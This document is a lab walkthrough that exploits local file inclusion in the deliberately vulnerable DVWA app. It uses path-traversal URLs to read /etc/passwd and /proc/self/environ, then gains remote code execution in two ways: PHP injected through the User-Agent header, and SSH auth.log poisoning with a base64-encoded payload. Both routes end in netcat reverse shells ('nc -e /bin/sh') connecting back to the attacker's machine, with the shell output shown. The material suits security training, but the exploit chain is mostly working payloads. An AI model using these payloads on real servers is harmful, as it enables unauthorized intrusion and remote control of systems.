### Local File Inclusion Security-Level-Low

* This vulnerability allows an attacker to read any file on the same server.
* Also allows you to read files outside the /www/ directory.


* First the url is trying to run a file called include.php
* So im going to test if the server does infact have a file called include.php

```
http://10.0.2.5/dvwa/vulnerabilities/fi/include.php
```

* When i navigate to this url the following error is displayed.

```
Fatal error: Call to undefined function dvwaExternalLinkUrlGet() in /var/www/dvwa/vulnerabilities/fi/include.php on line 15
```

* This shows that a file called include.php is on the server.
* Now im going to try read the /etc/passwd file, which contains all ther users on the server.

* To do this im going to have to back five directories to read /etc/passwd.
* To move back a directory we can use ../ 

```
http://10.0.2.5/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd
```

* The following output is displayed showing the users on the server.

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false snmp:x:115:65534::/var/lib/snmp:/bin/false
Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /etc/passwd:12) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
```


---

### Local File Inclusion Gaining Shell Access Method-1

* One way to get shell access from local file inclusion vulnerabilites is by executed code on files you can read.
* These files on apache web server are usually;

1. /proc/self/environ
2. /var/log/auth.log
3. /var/log/apache2/access.log

* So im going to try and execute code in the /proc/self/environ
* This file contains a array of variables for the current environment.

* First i'm going to try to navigate to this file.

```
http://10.0.2.5/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environ
```

* The output is the following

```
REDIRECT_HANDLER=php5-cgiREDIRECT_STATUS=200HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Paros/3.2.13HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5HTTP_COOKIE=security=low; PHPSESSID=f06d8840b5ab8989da75b5a92751bb56HTTP_DNT=1HTTP_CONNECTION=keep-aliveHTTP_UPGRADE_INSECURE_REQUESTS=1HTTP_HOST=10.0.2.5PATH=/usr/local/bin:/usr/bin:/binSERVER_SIGNATURE=
Apache/2.2.8 (Ubuntu) DAV/2 Server at 10.0.2.5 Port 80
SERVER_SOFTWARE=Apache/2.2.8 (Ubuntu) DAV/2SERVER_NAME=10.0.2.5SERVER_ADDR=10.0.2.5SERVER_PORT=80REMOTE_ADDR=10.0.2.15DOCUMENT_ROOT=/var/www/SERVER_ADMIN=webmaster@localhostSCRIPT_FILENAME=/usr/lib/cgi-bin/phpREMOTE_PORT=54215REDIRECT_QUERY_STRING=page=../../../../../proc/self/environREDIRECT_URL=/dvwa/vulnerabilities/fi/index.phpGATEWAY_INTERFACE=CGI/1.1SERVER_PROTOCOL=HTTP/1.1REQUEST_METHOD=GETQUERY_STRING=page=../../../../../proc/self/environREQUEST_URI=/dvwa/vulnerabilities/fi/?page=../../../../../proc/self/environSCRIPT_NAME=/cgi-bin/phpPATH_INFO=/dvwa/vulnerabilities/fi/index.phpPATH_TRANSLATED=/var/www/dvwa/vulnerabilities/fi/index.php
Warning: Cannot modify header information - headers already sent by (output started at /proc/13602/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 324

Warning: Cannot modify header information - headers already sent by (output started at /proc/13602/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 325

Warning: Cannot modify header information - headers already sent by (output started at /proc/13602/environ:1) in /var/www/dvwa/dvwa/includes/dvwaPage.inc.php on line 326
```

* We can see from the output the user_agent of the my browser is posted. 
* What we can do is run code where the user_agent by intercept the request with a web proxy.
* As the user_agent field is sent from the client.

* I'm going to change the user_agent to <?phpinfo();?>. To see if it runs php code.

* Now you should see the php info page being display on the browser.

```
REDIRECT_HANDLER=php5-cgiREDIRECT_STATUS=200HTTP_USER_AGENT=
PHP Logo
PHP Version 5.2.4-2ubuntu5.10
```

* Now we can execute any php code on the server through the user_agent.
* I'm going to be using passthru function from php to execute a netcat shell.

* I'm going to use the following command to execute my shell.

```
<?passthru("nc -e /bin/sh 10.0.2.15 4444");?>
```

* This command will connect back to my local machine on port 4444 in which i will recieve a reverse shell.
* First let m setup my netcat listener to listen on port 4444.

```
nc -vv  -l -p 4444
```

* Now we intercept the request and enter in the passthru function to execute our shell.

* We recieve a netcat reverse shell.

```
root@kali:~# nc -vv -l -p 4444
listening on [any] 4444 ...
10.0.2.5: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 40600
ls -la
total 24
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data  488 Aug 26  2010 include.php
-rw-r--r--  1 www-data www-data  818 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


---

### Local File Inclusion Gaining Shell Access Method-2

* With the previous method we executed code on the /proc/self/environ
* In this section i'm going execute code in the apache log files;

1. /var/log/auth.log
2. /var/log/apache2/access.log

* The two files above is readable to the user.
* First let me navigate to the /var/log/auth.log


```
http://10.0.2.5/dvwa/vulnerabilities/fi/?page=../../../../../var/log/auth.log
```

* You should now see log files from apache web server.
* This file reads login attempts.
* What we can do here is login into ssh, but we'll be using php code as the file will read it and execute this code.

* So first setup a netcat listener.

```
nc -vv -l -p 4444
```

* Now we login into ssh using passthru function from php to execute our reverse shell.

```
ssh "<?passthru("nc -e /bin/sh 10.0.2.15 4444");?>"@10.0.2.5
```

* So what i did here was login into ssh with the user this being the php code to execute a reverse shell followed by the ip address of the server.
* Now we need to encode the spaces between the shell as the server will send back an error.
* So im to avoid all the special characters.

```
root@kali:~# echo "nc -e /bin/sh 10.0.2.15 4444"|base64
bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgNDQ0NAo=
```

* So now that i have encoded the nc.
* Now i paste it into the passthru function.

```
ssh "<?passthru('bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgNDQ0NAo=');?>"@10.0.2.5
```

* Now we need php to decode this string and then run the passthru function.
* I'm going to use the base64 decode function from php.

```
ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxMC4wLjIuMTUgNDQ0NAo='));?>"@10.0.2.5
```

* Now we recieve a reverse shell.

```
oot@kali:~# nc -vv -l -p 4444
listening on [any] 4444 ...
10.0.2.5: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 34577
ls -la
total 24
drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
-rw-r--r--  1 www-data www-data  488 Aug 26  2010 include.php
-rw-r--r--  1 www-data www-data  818 Mar 16  2010 index.php
drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

